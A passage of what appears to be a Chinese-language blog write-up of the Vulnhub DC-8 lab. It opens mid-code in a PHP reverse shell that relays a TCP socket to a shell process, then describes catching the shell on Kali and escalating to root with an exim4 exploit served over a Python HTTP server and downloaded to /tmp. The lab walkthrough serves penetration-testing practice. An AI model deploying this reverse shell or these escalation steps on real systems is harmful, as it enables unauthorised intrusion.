class="line">    <span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">    <span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line">    <span class="comment">// send data down tcp connection</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">  <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">  <span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line">  <span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span></span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">?&gt;</span> </span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171809111.png"></p>
+<p>kali需要提前监听,等待反弹shell<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171816255.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>家目录没有东西,sudo -l需要密码,但是发现一个exim4命令<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171819787.png"></p>
+<p>查看exim4 版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep exim</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171856431.png"></p>
+<p>用msf搜索利用,发现需要一个会话<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171825215.png"></p>
+<p>利用拿到的shell,反弹一个会话给msf<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171839142.png"></p>
+<p>利用失败,再找别的exp打,找提权的<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171842636.png"></p>
+<p>将几个exp拷贝出来,kali用python起一个http服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171845121.png"></p>
+<p>靶机下载,注意要到tmp目录下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171857239.png"></p>
+<p>使用exp,在&#x2F;root下找到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206171900511.png"></p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.JPG" alt="Syst1m 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.JPG" alt="Syst1m 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Syst1m
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://syst1m.top/2022/06/16/vulnhub-dc8%E6%89%93%E9%9D%B6/" title="vulnhub-dc8打靶">https://syst1m.top/2022/06/16/vulnhub-dc8打靶/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/Drupal/" rel="tag"># Drupal</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/06/15/vulnhub-dc7%E6%89%93%E9%9D%B6/" rel="prev" title="vulnhub-dc7打靶">
+                  <i class="fa fa-chevron-left"></i> vulnhub-dc7打靶
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Syst1m</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
